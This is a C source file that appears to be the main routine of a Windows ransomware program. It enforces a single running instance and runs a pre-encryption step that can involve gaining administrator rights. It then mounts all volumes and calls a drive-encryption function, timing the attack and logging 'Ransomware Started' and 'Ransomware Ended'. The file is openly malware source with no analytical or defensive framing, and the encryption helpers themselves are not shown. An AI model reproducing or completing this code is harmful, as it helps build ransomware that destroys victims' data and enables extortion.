#include "debug.h"
#include "pre.h"
#include "encryptor.h"

/* Name of the one-instance mutex. */
#define MUTEX_NAME L"ef223080-f09c-413a-89db-62d675d90f56"

int main(int argc, char* argv[])
{
	if (!IsWindowsVistaOrGreater())
	{
		ndbgmsg("OS must be Windows Vista or greater\n");
		return 1;
	}
	
	// One-Instance mutex
	HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
	if (!hMutex)
		return 2;
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		printf("Program already running\n");
		goto cleanup;
	}
	
	// Execute all pre-encryption tasks
	int preStatus = preEncryption();
	if (preStatus == PSTATUS_GOT_ADMIN)
		goto cleanup;
	ndbgmsg("Pre-Encryption returned status: %d\n", preStatus);
	
	ndbgmsg("\nMounting Volumes\n");
	mountVolumes();
	
	ndbgmsg("\nRansomware Started\n");
	time_t t0 = time(NULL);
	BOOL result = encryptDrives();
	time_t t1 = time(NULL);
	
	ndbgstatus(result, "Ransomware Ended");
	ndbgmsg("%.03f seconds / %.03f minutes\n\n", (float)(t1 - t0), (float)(t1 - t0) / 60);
	
cleanup:
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	
#ifdef DEBUG
	_CrtSetReportMode(_CRT_WARN, _CRTDBG_MODE_DEBUG);
	if (_CrtDumpMemoryLeaks())
		fprintf(stderr, "------------- Memory leaks detected. Check console. -------------\n");
	else
		fprintf(stderr, "------------- No memory leaks were found -------------\n");
#endif
	
	return 0;
}